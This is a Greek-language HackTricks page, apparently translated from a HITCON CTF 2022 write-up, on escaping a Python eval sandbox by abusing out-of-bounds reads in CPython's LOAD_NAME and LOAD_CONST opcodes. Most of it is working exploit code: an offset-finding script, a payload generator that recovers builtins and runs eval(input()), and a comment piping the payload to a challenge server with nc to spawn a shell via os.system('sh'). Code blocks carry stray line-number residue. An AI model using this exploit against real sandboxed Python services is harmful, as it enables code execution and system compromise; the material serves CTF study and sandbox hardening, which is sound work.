# LOAD_NAME / LOAD_CONST opcode OOB Read

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα χάκερ υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο github.

</details>
{% endhint %}

**Αυτές οι πληροφορίες προήχθησαν** [**από αυτήν την ανάλυση**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Μπορούμε να χρησιμοποιήσουμε το χαρακτηριστικό OOB read στον κώδικα LOAD_NAME / LOAD_CONST opcode για να ανακτήσουμε κάποιο σύμβολο από τη μνήμη. Αυτό σημαίνει χρήση κόλπου όπως `(a, b, c, ... εκατοντάδες σύμβολα ..., __getattribute__) if [] else [].__getattribute__(...)` για να ανακτήσετε ένα σύμβολο (όπως το όνομα μιας συνάρτησης) που θέλετε.

Στη συνέχεια απλά δημιουργήστε την εκμετάλλευσή σας.

### Επισκόπηση <a href="#overview-1" id="overview-1"></a>

Ο πηγαίος κώδικας είναι αρκετά σύντομος, περιέχει μόνο 4 γραμμές!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
### Ανάγνωση εκτός ορίων <a href="#out-of-bound-read" id="out-of-bound-read"></a>

Πώς συμβαίνει το σφάλμα σεγμεντέισον;

Ας ξεκινήσουμε με ένα απλό παράδειγμα, `[a, b, c]` μπορεί να μεταγλωττιστεί στον ακόλουθο κώδικα bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Αλλά τι συμβαίνει αν τα `co_names` γίνουν ένα κενό tuple; Το `LOAD_NAME 2` opcode εξακολουθεί να εκτελείται και προσπαθεί να διαβάσει την τιμή από αυτήν τη διεύθυνση μνήμης που αρχικά έπρεπε να είναι. Ναι, αυτό είναι ένα χαρακτηριστικό εκτός ορίων ανάγνωσης.

Το βασικό συναίσθημα για τη λύση είναι απλό. Κάποια opcodes στο CPython, για παράδειγμα το `LOAD_NAME` και το `LOAD_CONST`, είναι ευάλωτα (?) στην OOB ανάγνωση.

Ανακτούν ένα αντικείμενο από το δείκτη `oparg` από το tuple `consts` ή `names` (αυτό που ονομάζεται `co_consts` και `co_names` κάτω από το καπάκι). Μπορούμε να αναφερθούμε στο ακόλουθο σύντομο απόσπασμα σχετικά με το `LOAD_CONST` για να δούμε τι κάνει το CPython όταν επεξεργάζεται το `LOAD_CONST` opcode.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
Με αυτόν τον τρόπο μπορούμε να χρησιμοποιήσουμε το χαρακτηριστικό OOB για να λάβουμε ένα "όνομα" από αυθαίρετη μνήμη. Για να βεβαιωθούμε για το όνομα που έχει και το offset του, απλά συνεχίστε να δοκιμάζετε `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Και θα μπορούσατε να βρείτε κάτι γύρω από oparg > 700. Μπορείτε επίσης να δοκιμάσετε να χρησιμοποιήσετε το gdb για να ρίξετε μια ματιά στη διάταξη της μνήμης φυσικά, αλλά δεν νομίζω ότι θα ήταν πιο εύκολο;

### Δημιουργία του Εκμεταλλευτή <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Αφού ανακτήσουμε αυτά τα χρήσιμα offsets για ονόματα / σταθερές, πώς _μπορούμε_ να λάβουμε ένα όνομα / σταθερά από αυτό το offset και να το χρησιμοποιήσουμε; Εδώ υπάρχει ένα κόλπο για εσάς:\
Ας υποθέσουμε ότι μπορούμε να λάβουμε ένα όνομα `__getattribute__` από το offset 5 (`LOAD_NAME 5`) με `co_names=()`, τότε απλά κάντε τα ακόλουθα:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Σημείωσε ότι δεν είναι απαραίτητο να το ονομάσεις `__getattribute__`, μπορείς να το ονομάσεις κάτι πιο σύντομο ή πιο παράξενο

Μπορείς να καταλάβεις τον λόγο απλά βλέποντας το bytecode του:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Σημειώστε ότι το `LOAD_ATTR` ανακτά επίσης το όνομα από το `co_names`. Το Python φορτώνει ονόματα από την ίδια θέση εάν το όνομα είναι το ίδιο, έτσι το δεύτερο `__getattribute__` φορτώνεται ακόμα από τη θέση offset=5. Χρησιμοποιώντας αυτό το χαρακτηριστικό μπορούμε να χρησιμοποιήσουμε το όνομα που θέλουμε μια φορά που το όνομα βρίσκεται στη μνήμη κοντά.

Για τη δημιουργία αριθμών θα πρέπει να είναι ασήμαντο:

* 0: not \[\[]]
* 1: not \[]
* 2: (not \[]) + (not \[])
* ...

### Σενάριο Εκμετάλλευσης <a href="#exploit-script-1" id="exploit-script-1"></a>

Δεν χρησιμοποίησα σταθερές λόγω του όριου μήκους.

Πρώτα εδώ υπάρχει ένα σενάριο για εμάς για να βρούμε αυτές τις θέσεις των ονομάτων.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Και το παρακάτω είναι για τη δημιουργία του πραγματικού εκμεταλλεύματος Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Βασικά κάνει τα ακόλουθα πράγματα, για εκείνες τις συμβολοσειρές που τις λαμβάνουμε από τη μέθοδο `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 [**στην ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε τεχνικές χάκινγκ υποβάλλοντας PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
